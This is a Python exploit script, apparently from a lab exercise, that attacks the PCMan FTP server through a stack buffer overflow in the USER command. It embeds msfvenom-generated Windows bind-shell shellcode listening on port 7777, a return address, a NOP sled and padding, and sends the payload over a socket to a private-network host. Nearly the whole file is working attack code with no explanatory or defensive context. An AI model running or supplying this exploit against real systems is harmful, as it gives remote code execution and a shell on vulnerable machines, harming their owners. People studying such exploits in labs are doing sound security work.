#!/usr/bin/python3
import socket
import sys
from pwn import *

host = '192.168.5.128'
port = 21

# msfvenom -p windows/shell_bind_tcp LPORT=7777 --arch x86 --format python -b "\x00,\x0d,\x0a"
buf =  b""
buf += b"\xdb\xcc\xd9\x74\x24\xf4\x5d\xb8\xeb\xe1\xbb\x96\x29"
buf += b"\xc9\xb1\x53\x31\x45\x17\x03\x45\x17\x83\x2e\xe5\x59"
buf += b"\x63\x4c\x0e\x1f\x8c\xac\xcf\x40\x04\x49\xfe\x40\x72"
buf += b"\x1a\x51\x71\xf0\x4e\x5e\xfa\x54\x7a\xd5\x8e\x70\x8d"
buf += b"\x5e\x24\xa7\xa0\x5f\x15\x9b\xa3\xe3\x64\xc8\x03\xdd"
buf += b"\xa6\x1d\x42\x1a\xda\xec\x16\xf3\x90\x43\x86\x70\xec"
buf += b"\x5f\x2d\xca\xe0\xe7\xd2\x9b\x03\xc9\x45\x97\x5d\xc9"
buf += b"\x64\x74\xd6\x40\x7e\x99\xd3\x1b\xf5\x69\xaf\x9d\xdf"
buf += b"\xa3\x50\x31\x1e\x0c\xa3\x4b\x67\xab\x5c\x3e\x91\xcf"
buf += b"\xe1\x39\x66\xad\x3d\xcf\x7c\x15\xb5\x77\x58\xa7\x1a"
buf += b"\xe1\x2b\xab\xd7\x65\x73\xa8\xe6\xaa\x08\xd4\x63\x4d"
buf += b"\xde\x5c\x37\x6a\xfa\x05\xe3\x13\x5b\xe0\x42\x2b\xbb"
buf += b"\x4b\x3a\x89\xb0\x66\x2f\xa0\x9b\xee\x9c\x89\x23\xef"
buf += b"\x8a\x9a\x50\xdd\x15\x31\xfe\x6d\xdd\x9f\xf9\x92\xf4"
buf += b"\x58\x95\x6c\xf7\x98\xbc\xaa\xa3\xc8\xd6\x1b\xcc\x82"
buf += b"\x26\xa3\x19\x3e\x2e\x02\xf2\x5d\xd3\xf4\xa2\xe1\x7b"
buf += b"\x9d\xa8\xed\xa4\xbd\xd2\x27\xcd\x56\x2f\xc8\xef\xc7"
buf += b"\xa6\x2e\x65\x18\xef\xf9\x11\xda\xd4\x31\x86\x25\x3f"
buf += b"\x6a\x20\x6d\x29\xad\x4f\x6e\x7f\x99\xc7\xe5\x6c\x1d"
buf += b"\xf6\xf9\xb8\x35\x6f\x6d\x36\xd4\xc2\x0f\x47\xfd\xb4"
buf += b"\xac\xda\x9a\x44\xba\xc6\x34\x13\xeb\x39\x4d\xf1\x01"
buf += b"\x63\xe7\xe7\xdb\xf5\xc0\xa3\x07\xc6\xcf\x2a\xc5\x72"
buf += b"\xf4\x3c\x13\x7a\xb0\x68\xcb\x2d\x6e\xc6\xad\x87\xc0"
buf += b"\xb0\x67\x7b\x8b\x54\xf1\xb7\x0c\x22\xfe\x9d\xfa\xca"
buf += b"\x4f\x48\xbb\xf5\x60\x1c\x4b\x8e\x9c\xbc\xb4\x45\x25"
buf += b"\xcc\xfe\xc7\x0c\x45\xa7\x92\x0c\x08\x58\x49\x52\x35"
buf += b"\xdb\x7b\x2b\xc2\xc3\x0e\x2e\x8e\x43\xe3\x42\x9f\x21"
buf += b"\x03\xf0\xa0\x63"


buffer = b"A" * 2002
buffer += p32(0x7256780F)  #7256780F
buffer += b"\x90" * 20
buffer += buf
buffer += b"\xCC" * (5000 - len(buffer))

data = b'USER ' + buffer


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print(s.recv(1024))
print("[+] Connected to PCMAN FTP")
print("[+]Length of Buffer: " + str(len(buffer)))
print("[+]Sending Exploit")
s.send(data)
s.close()